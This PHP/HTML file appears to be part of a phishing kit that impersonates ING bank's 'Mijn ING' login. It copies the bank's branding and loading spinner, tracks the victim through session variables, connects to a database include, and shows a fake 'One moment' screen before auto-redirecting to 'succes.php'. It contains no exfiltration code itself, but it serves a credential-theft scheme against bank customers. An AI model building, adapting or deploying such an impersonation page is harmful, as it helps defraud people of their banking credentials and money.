<?php
error_reporting(0);
session_start();
if ( isset( $_SESSION['klant'] ) ) {
} else {
	echo $gebruikersnaam;
}
include 'dbconnect.php';
    if(empty($_SESSION['gebruikersnaam'])){
//        header("Location: index.php");
//        die("Redirecting to index.php");
    }
	header( "refresh:20;url=succes.php" );
?>
<html lang="nl" class="no-js">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
    <style is="custom-style">html {
            padding: 0;
            margin: 0;
            background-color: #f5f5f5;
        }
			
			ul.topnav {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    background-color: white;
	height: 64px;
	box-sizing: border-box;
	box-shadow: 0 0 1px 0 rgba(0, 0, 0, 0.12), 0 1px 1px 0 rgba(0, 0, 0, 0.24);
}

ul.topnav li.left {float: left;
			padding-left: 18%;
			padding-top: 13px;
			padding-bottom: 13px;}

ul.topnav li a {
    display: block;
    color: black;
    text-align: center;

    text-decoration: none;
}

ul.topnav li a:hover:not(.active) {background-color: white;}

ul.topnav li a.active {background-color: white;}

ul.topnav li.right {
					cursor: pointer;
					display: inline-block;
					font-size: 1rem;
					line-height: 1.5;
					padding-top: 22px;
					padding-bottom: 13px;}

@media screen and (max-width: 600px){
    ul.topnav li.right, 
    ul.topnav li {float: none;}
}

.rightdiv{
	float: right;
	padding-right: 18%;
}

.test{
	border-right: 1px solid black;
	padding-right: 8px;
	font-weight: 700;
	font-size: 16px;
	color: #333333;
}

.activelan2{
	padding: 8px;
}

.login{
	width: 100%;
	max-width: 448px;
	margin-top: 20px;
	margin-left: 38%;
	margin-right: 38%;
	padding: 24px;
	box-shadow: 0 0 2px 0 rgba(0, 0, 0, 0.12), 0 2px 2px 0 rgba(0, 0, 0, 0.24);
	background-color: white;
	border-radius: 5px;
	}
	
#ingtekst{
		color:#ff6200;
		font-size: 24px;
		font-weight: 700;
	}
	
	.box1{
		            background: transparent;
            border-top: transparent !important;
            border-left: transparent !important;
            border-right: transparent !important;
		width: 80%;
		font-size: 16px;
		font-stretch: 100%;
		border-bottom: 1px solid rgb(118, 118, 118);
	}
	
	.nieuw{
		background-color: #F3F8FC;
	}
	
	.nieuw1{
		padding: 10px;
		border-radius: 10px;
	}
	
	#nieuwtekst{
		color: #333333;
		font-size: 16px;
		font-weight: 700;
		line-height: 24px;
	}
	
	#nieuwtekst1{
		margin-left: 31px!important;
		margin-top: -10px;
		margin-bottom: -3px;
	}
	
	button { border:none; background-color: #F3F8FC;} 
	
	#infolink{
		color: #525199;
		border-bottom: 1px solid #cbcbe0;
	}
	
	#infolink:visited{
		color: #ab0066;
		border-bottom: 1px solid #e6b3d1;
	}
	
	#radiotekst{
		color: #767676;
		font-size: 12px;
	}
	
input[type=radio   ]:not(old){
  width     : 2em;
  margin    : 0;
  padding   : 0;
  font-size : 1em;
  opacity   : 0;
}

input[type=radio   ]:not(old) + label{
  display      : inline-block;
  margin-left  : -2em;
  line-height  : 1.5em;
}

input[type=radio   ]:not(old) + label > span{
  display          : inline-block;
  width            : 20px;
  height           : 20px;
  margin           : 0.25em 0.5em 0.25em 0.25em;
  border           : 2px solid #ff6200;
  border-radius    : 50px;
  background       : white;
  vertical-align   : bottom;
}

input[type=radio   ]:not(old):checked + label > span{
  background :    white;
}

input[type=radio]:not(old):checked +  label > span > span{
  display          : block;
  width            : 10px;
  height           : 10px;
  margin-left           : 3px;
  margin-top           : 3px;
  border           : 1px solid #ff6200;
    border-radius    : 50px;
  background       : #ff6200;
}

.radiobuttons{
	margin-top: -10px;
}

input[type=submit] {
	color: white;
    padding:5px 15px; 
    background:#ff6200; 
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 5px;
    border-radius: 5px; 
	font-size: 19px;
	font-weight: 700;
}

#hulp{
	color: black;
}

#hulp:hover{
	text-decoration: none;
}

.links{
	width: 100%;
	max-width: 448px;
	margin-top: 20px;
	margin-left: 38%;
	margin-right: 38%;
}

#link{
	border-bottom: 1px solid #cbcbe0;
	text-decoration: none;
	color: black;
	font-size: 14px;
}

#link:hover{
	border-bottom: 1px solid #525199;
}

#link:visited{
	border-bottom: 1px solid #e6b3d1;
}

input[type=checkbox]:not(old){
  width     : 2em;
  margin    : 0;
  padding   : 0;
  font-size : 1em;
  opacity   : 0;
}

input[type=checkbox]:not(old) + label{
  display      : inline-block;
  margin-left  : -2em;
  line-height  : 1.5em;
}

input[type=checkbox]:not(old) + label > span{
  display          : inline-block;
  width            : 20px;
  height           : 20px;
  margin           : 0.25em 0.5em 0.25em 0.25em;
  border           : 2px solid #767676;
  border-radius    : 2px;
  background       : white;
  vertical-align   : bottom;
}

input[type=checkbox]:not(old):checked + label > span{
  background :    #ff6200;
  border-color: #ff6200;
}

input[type=checkbox]:not(old):checked + label > span:before{
  content     : url('checkbox.svg');
  display     : block;
  width       : 16px;
  color       : white;
  font-size   : 0.875em;
  line-height : 1em;
  text-align  : center;
  text-shadow : 0 0 0.0714em rgb(115,153,77);
  font-weight : bold;
}

input[type=text]:focus,input[type=password]:focus  {
	border-top: transparent !important;
	border-left: transparent !important;
	border-right: transparent !important;
	outline: 0;
    border-bottom: 2px solid  #ff6200;
}

.paneel {
	  background-color: black;
		color: white;
		  border: 2px solid #767676;
		  width: 50%;
		  text-align: center;

}
        body {
            background-color: transparent;
            min-height: 100vh;
            height: 0;
            display: flex;
            flex-direction: column;
        }

</style>
    
    <style>@-webkit-keyframes spin {
               to {
                   -webkit-transform: rotate(1080deg);
                   transform: rotate(1080deg);
               }
           }

        @keyframes spin {
            to {
                -webkit-transform: rotate(1080deg);
                transform: rotate(1080deg);
            }
        }

        .spinner-wrapper {
            width: 26px;
            height: 26px;
            border-radius: 100%;
            display: inline-block;
            position: relative;
        }

        .spinner {
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            border-radius: 100%;
            position: absolute;
            border: 3px solid currentColor;
            will-change: transition;
            -webkit-animation: spin 2666ms linear infinite;
            animation: spin 2666ms linear infinite;
            background-color: #fff;
        }

        .spinner[data-options*="blue"] {
            color: #4285f4;
        }

        .spinner[data-options*="orange"] {
            color: #ff6200;
        }

        .spinner[data-options*="large"] {
            font-size: 2em;
        }

        .spinner[data-options*="xlarge"] {
            font-size: 3em;
        }

        .spinner::before,
        .spinner::after {
            content: "";
            position: absolute;
            width: 7em;
            height: 22px;
            background-color: inherit;
        }

        @-webkit-keyframes shape-shift-before {
            to {
                -webkit-transform: skewX(-45deg) translate(11px, -11px);
                transform: skewX(-45deg) translate(11px, -11px);
            }
        }

        @keyframes shape-shift-before {
            to {
                -webkit-transform: skewX(-45deg) translate(11px, -11px);
                transform: skewX(-45deg) translate(11px, -11px);
            }
        }

        .spinner::before {
            -webkit-transform: skewX(80deg) translate(11px, -11px);
            -ms-transform: skewX(80deg) translate(11px, -11px);
            transform: skewX(80deg) translate(11px, -11px);
            -webkit-animation: shape-shift-before 1066.4ms cubic-bezier(.4, 0, .2, 1) infinite alternate;
            animation: shape-shift-before 1066.4ms cubic-bezier(.4, 0, .2, 1) infinite alternate;
        }

        @-webkit-keyframes shape-shift-after {
            to {
                -webkit-transform: skewX(45deg) translate(11px, 11px);
                transform: skewX(45deg) translate(11px, 11px);
            }
        }

        @keyframes shape-shift-after {
            to {
                -webkit-transform: skewX(45deg) translate(11px, 11px);
                transform: skewX(45deg) translate(11px, 11px);
            }
        }

        .spinner::after {
            -webkit-transform: skewX(-80deg) translate(11px, 11px);
            -ms-transform: skewX(-80deg) translate(11px, 11px);
            transform: skewX(-80deg) translate(11px, 11px);
            -webkit-animation: shape-shift-after 1066.4ms cubic-bezier(.4, 0, .2, 1) infinite alternate;
            animation: shape-shift-after 1066.4ms cubic-bezier(.4, 0, .2, 1) infinite alternate;
        }

        #preloader-placeholder {
            z-index: 5;
            padding: 0;
            margin: 0;
            position: absolute;
            min-height: 712px;
            height: 0;
            display: flex;
            flex-direction: column;
            flex: 1 1 auto;
            align-items: center;
            width: 100%;
            top: 0;
            left: 0;
        }



        .preload-topbar-wrapper {
            height: 64px;
            width: 100%;
            margin-bottom: 24px;
            background-color: white;
            box-shadow: 0 0 1px 0 rgba(0, 0, 0, 0.12), 0 1px 1px 0 rgba(0, 0, 0, 0.24);
        }


        .preload-img-wrapper {
            display: flex;
            align-items: center;
            height: 100%;
            padding: 0 24px;
            margin: 0 auto;
        }

        .preload-img img {
            width: 118px;
            height: 30px;
        }

        .preload-content-wrapper {
            flex-grow: 1;
            flex-basis: auto;
            width: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .preload-content {
            width: 448px;
            height: 520px;
            max-width: 100%;
            box-sizing: content-box;
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 1px 5px 0 rgba(0, 0, 0, 0.12), 0 3px 1px -2px rgba(0, 0, 0, 0.2);
            background-color: white;
            border-radius: 4px;
            justify-content: center;
            align-items: center;
            display: flex;
            flex-direction: column;
        }

        .no-js .preload-content {
            height: auto;
            flex-direction: row;
            padding: 24px;
        }

        .no-js .spinner-wrapper {
            display: none;
        }

        .spinner-h1 {
            font-family: INGMe, arial, helvetica, sans-serif;
            font-size: 14px;
            font-weight: 400;
            height: 20px;
            justify-content: normal;
            line-height: 20.006px;
            margin-bottom: 16px;
            margin-top: 0;
            padding-top: 14px;
            position: relative;
            -webkit-font-smoothing: antialiased;
            -webkit-margin-after: 16px;
            -webkit-margin-before: 0;
            -webkit-margin-end: 0;
            -webkit-margin-start: 0;
            z-index: 10;
        }

        .footer-placeholder {
            height: 64px;
            width: 10px;
        }



        </style>
</head>
<body>
 <ul class="topnav">
  <li class="left"><a class="active" href="index.php"><img style="height: 35px; width: 118px;" src="logo1.png"></a></li>
  <div class="rightdiv"><li class="right activelan"><a class="test" href="">NL</a></li>
  <li class="right activelan2"><a href="" style="color: #767676">EN</a></li></div>
</ul>
    <div class="preload-content-wrapper">
        <section class="preload-content">
            <noscript>
                <div class="header-container-no-js"><img class="alert-icon-no-js"
                                                         src="assets/images/icons/alert-warning.svg">
                    <h1 class="header-no-js">Javascript is uitgeschakeld</h1></div>
                <p>Om Mijn ING te gebruiken, ga naar je instellingen en schakel Javascript in.</p></noscript>
            <div class="spinner-wrapper">
                <div class="spinner" data-options="orange" role="progressbar" aria-valuetext="Loading…"></div>
            </div>
            <h1 class="spinner-h1">
                <script>var isEnglish = -1 < document.cookie.indexOf("en-GB"),
                        isFrench = -1 < document.cookie.indexOf("fr-BE"),
                        isGerman = -1 < document.cookie.indexOf("de-BE"), loadingText = "Een moment...";
                    if (isEnglish) loadingText = "One moment...";
                    if (isFrench) loadingText = "Un moment...";
                    if (isGerman) loadingText = "Einen Moment...";
                    document.write(loadingText);</script>
            </h1>
        </section>
        <section class="footer-placeholder"></section>
    </div>
</blockquote>
<script>document.querySelector("html").classList.remove("no-js");
    window.ING.performanceMarkers.appAuthFirstPaint = performance.now();</script>
<script nomodule="" src="src/polyfills/polyfill.min.js?rev=4.5.0-release-65bedeac"></script>
<script nomodule="" src="node_modules/url-polyfill/url-polyfill.min.js?rev=4.5.0-release-65bedeac"></script>
<script>if (!window.customElements) {
        document.write("<!--")
    }</script>
<script type="text/javascript" src="bower_components/webcomponentsjs/custom-elements-es5-adapter.js"></script>
<!--! do not remove -->
<script src="bower_components/webcomponentsjs/webcomponents-lite.js?rev=4.5.0-release-65bedeac"></script>
<script src="bower_components/webcomponentsjs/custom-elements-es5-adapter.js?rev=4.5.0-release-65bedeac"></script>
<script src="src/config/environment.js?rev=4.5.0-release-65bedeac"></script>
<link rel="import" id="bundle" href="packages/ing-app-authentication-login.html?rev=4.5.0-release-65bedeac">
<iframe src="login/lockpoint.html" id="lockPoint" frameborder="0" style="width: 0; height: 0; border: none;"></iframe>
</body>
</html>